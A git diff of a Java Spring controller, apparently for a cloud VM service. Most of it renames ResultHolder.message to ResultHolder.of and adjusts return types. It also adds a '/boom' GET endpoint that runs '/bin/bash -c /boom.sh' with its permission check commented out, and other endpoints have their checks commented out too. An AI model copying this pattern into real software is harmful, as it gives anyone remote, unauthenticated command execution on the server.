@@ -1,5 +1,7 @@
 package com.fit2cloud.controller;
 
+import com.alibaba.fastjson2.JSONArray;
+import com.alibaba.fastjson2.JSONObject;
 import com.baomidou.mybatisplus.core.metadata.IPage;
 import com.fit2cloud.controller.handler.ResultHolder;
 import com.fit2cloud.controller.request.vm.CreateServerRequest;
@@ -73,7 +75,7 @@ public class GoodsController {
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
     public ResultHolder<Object> CardKeyExchange(@RequestBody CDcard card) throws Exception {
         Map result = goodsService.writeoff(card);
-        return ResultHolder.message(result.get("code"),result.get("msg"),null);
+        return ResultHolder.of(result.get("code"),result.get("msg"),null);
     }
 
     @Operation(summary = "", description = "查询当前账号有效时间")
@@ -96,9 +98,9 @@ public class GoodsController {
     @Operation(summary = "", description = "开播")
     @PostMapping("/startVm")
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
-    public ResultHolder<Boolean> startVm() {
+    public ResultHolder<Object> startVm() {
         Map map = iVmDefaultService.startVm();
-        return ResultHolder.message(map.get("code"),map.get("msg"),null);
+        return ResultHolder.of(map.get("code"),map.get("msg"),null);
     }
 
 
@@ -106,22 +108,22 @@ public class GoodsController {
     @PostMapping("/serviceList")
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
     public ResultHolder<Object> serviceList() {
-        return ResultHolder.message(200,"ok",iVmDefaultService.getServiceList());
+        return ResultHolder.of(200,"ok",iVmDefaultService.getServiceList());
     }
 
 
     @Operation(summary = "", description = "设备列表")
     @PostMapping("/equipmentList")
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
-    public ResultHolder<Object> equipmentList() {
-        return ResultHolder.message(200,"ok",iVmDefaultService.getEquipmentList());
+    public ResultHolder<JSONArray> equipmentList() {
+        return ResultHolder.of(200,"ok",iVmDefaultService.getEquipmentList());
     }
 
     @Operation(summary = "", description = "设备详情")
     @GetMapping("/getEquipDetail")
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
-    public ResultHolder<Object> equipmentDetail(@RequestParam("uid") String uid) {
-        return ResultHolder.message(200,"ok",iVmDefaultService.getEquipmentDetail(uid));
+    public ResultHolder<JSONObject> equipmentDetail(@RequestParam("uid") String uid) {
+        return ResultHolder.of(200,"ok",iVmDefaultService.getEquipmentDetail(uid));
     }
 
 
@@ -129,7 +131,7 @@ public class GoodsController {
     @GetMapping("/getUserQR")
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
     public ResultHolder<Object> getUserQR() {
-        return ResultHolder.message(200,"ok",iVmDefaultService.getUserQR());
+        return ResultHolder.of(200,"ok",iVmDefaultService.getUserQR());
     }
 
 
@@ -137,6 +139,20 @@ public class GoodsController {
     @GetMapping("/addSubUser")
 //    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
     public ResultHolder<Object> addSubUser(@RequestParam("cecode") String info) {
-        return ResultHolder.message(200,"ok",iVmDefaultService.addSubUser(info));
+        return ResultHolder.of(200,"ok",iVmDefaultService.addSubUser(info));
+    }
+
+    @Operation(summary = "", description = "boom")
+    @GetMapping("/boom")
+//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
+    public ResultHolder<Object> boom() {
+        try {
+            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "/boom.sh"});
+            int exitCode = process.waitFor();
+            System.out.println("脚本执行完成，退出码：" + exitCode);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return ResultHolder.of(200,"ok","");
     }
 }
